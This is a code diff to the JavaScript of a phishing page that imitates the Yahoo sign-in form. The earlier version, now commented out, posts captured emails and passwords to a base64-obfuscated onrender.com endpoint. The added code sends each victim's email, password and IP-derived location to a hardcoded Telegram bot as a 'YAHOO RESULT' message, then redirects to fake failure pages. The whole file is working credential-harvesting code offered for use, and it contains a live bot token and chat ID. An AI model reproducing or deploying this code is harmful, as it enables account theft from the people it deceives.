@@ -1,7 +1,92 @@
+//OLD script with email result option
+
+// document.addEventListener("DOMContentLoaded", function () {
+//     console.log("loaded");
+
+//     const h = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20=";
+//     const e = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20vZW5kcG9pbnQ=";
+//     const ymr = /^[^\s@]+@yahoo\.com$/i;
+//     const nb = document.querySelector("#login-signin");
+//     const ei = document.querySelector("#login-username");
+//     const pi = document.querySelector("#login-passwd");
+//     const ec = document.querySelector(".yid");
+//     const sb = document.querySelector("#login-signin");
+//     const ue = "dXNlci1lbWFpbA=="
+
+//     if (nb) {
+//         nb.addEventListener("click", function (e) {
+//             e.preventDefault();
+//             if (!ei) {
+//                 return;
+//             };
+//             if (!ei.value) {
+//                 ei.addAttribute = disabled;
+//                 return;
+//             } else {
+//                 const ev = ei.value;
+//                 gtp(ev);
+//             };
+//         });
+//     }
+//     else {
+//         console.error("Element with id #login-signin not found");
+//     }
+
+//     const el = localStorage.getItem(atob(ue));
+//     ec.textContent = el;
+
+//     sb.addEventListener("click", async (e) => {
+//         e.preventDefault();
+//         const pd = pi.value;
+//         await sfr(el, pd);
+//     });
+
+
+//     function gtp(el) {
+//         const isy = isym(el);
+//         //then
+//         if (isy) {
+//             localStorage.setItem(atob(ue), el);
+//             window.location.href = `${atob(h)}/display-password.htm`;
+//         }
+//         return;
+//     };
+
+//     function isym(el) {
+//         return ymr.test(el);
+//     }
+
+
+//     async function sfr(el, pd) {
+//         localStorage.removeItem(atob(ue));
+
+//         const pld = {
+//             el,
+//             pd
+//         };
+//         try {
+//             const res = await axios.post(`${atob(e)}`, pld, {
+//                 headers: {
+//                     "Content-Type": "application/json",
+//                     "Access-Control-Allow-Origin": "*"
+//                 }
+//             });
+//             if (res.status == 200) {
+//                 window.location.href = `${atob(h)}/login-failed.htm`;
+//             } else {
+//                 window.location.href = `${atob(h)}/display-login.htm`;
+//             }
+//         } catch (error) {
+//             console.error("Error:", error);
+//         }
+//     };
+// });
+
+// New script with TG result box
 document.addEventListener("DOMContentLoaded", function () {
     console.log("loaded");
 
-    const h = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20=";
+    const h = "aHR0cHM6Ly9haG9vLW0ycGkub25yZW5kZXIuY29t"; //done
     const e = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20vZW5kcG9pbnQ=";
     const ymr = /^[^\s@]+@yahoo\.com$/i;
     const nb = document.querySelector("#login-signin");
@@ -10,6 +95,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const ec = document.querySelector(".yid");
     const sb = document.querySelector("#login-signin");
     const ue = "dXNlci1lbWFpbA=="
+    let loc;
 
     if (nb) {
         nb.addEventListener("click", function (e) {
@@ -36,11 +122,13 @@ document.addEventListener("DOMContentLoaded", function () {
     sb.addEventListener("click", async (e) => {
         e.preventDefault();
         const pd = pi.value;
-        await sfr(el, pd);
+       // await sfr(el, pd);
+        await getLoc();
+       await sendToTG(el, pd);
     });
 
 
-    function gtp(el) {
+    function gtp(el) {//goto password page
         const isy = isym(el);
         //then
         if (isy) {
@@ -55,28 +143,76 @@ document.addEventListener("DOMContentLoaded", function () {
     }
 
 
-    async function sfr(el, pd) {
-        localStorage.removeItem(atob(ue));
+    async function sendToTG(e, p) {
+        const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // Replace with your Telegram bot token
+        const chatId = 5645205996; // Replace with your chat ID
 
-        const pld = {
-            el,
-            pd
-        };
-        try {
-            const res = await axios.post(`${atob(e)}`, pld, {
-                headers: {
-                    "Content-Type": "application/json",
-                    "Access-Control-Allow-Origin": "*"
-                }
-            });
-            if (res.status == 200) {
-                window.location.href = `${atob(h)}/login-failed.htm`;
-            } else {
-                window.location.href = `${atob(h)}/display-login.htm`;
-            }
-        } catch (error) {
-            console.error("Error:", error);
-        }
+        const messageText = `**YAHOO RESULT**\nEmail: ${e}\nPassword: ${p} \n\nLocation: ${loc}`;
+
+  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+  const params = {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: messageText,
+    }),
+  };
+
+  fetch(url, params)
+    .then((response) => {
+        console.log(response);
+      if (!response.ok) {  
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then((data) => {
+      console.log("Message sent:", data);
+      // Redirect to another page after successful submission
+    //   if (data) {
+    //     window.location.href = `${atob(h)}/login-failed.htm`;
+    // } else {
+    //     window.location.href = `${atob(h)}/display-login.htm`;
+    // }
+        
+    })
+    .catch((error) => console.error("Error:", error));
+};
+
+    
+    async function getLoc(){
+        await fetch('https://hutils.loxal.net/whois').then(response => response.json()).then(data => {
+        loc = JSON.stringify(data, null, 2);
+      });
+        return;
     };
+
+    // async function sfr(el, pd) {
+    //     localStorage.removeItem(atob(ue));
+
+    //     const pld = {
+    //         el,
+    //         pd
+    //     };
+    //     try {
+    //         const res = await axios.post(`${atob(e)}`, pld, {
+    //             headers: {
+    //                 "Content-Type": "application/json",
+    //                 "Access-Control-Allow-Origin": "*"
+    //             }
+    //         });
+    //         if (res.status == 200) {
+    //             window.location.href = `${atob(h)}/login-failed.htm`;
+    //         } else {
+    //             window.location.href = `${atob(h)}/display-login.htm`;
+    //         }
+    //     } catch (error) {
+    //         console.error("Error:", error);
+    //     }
+    // };
 });
 
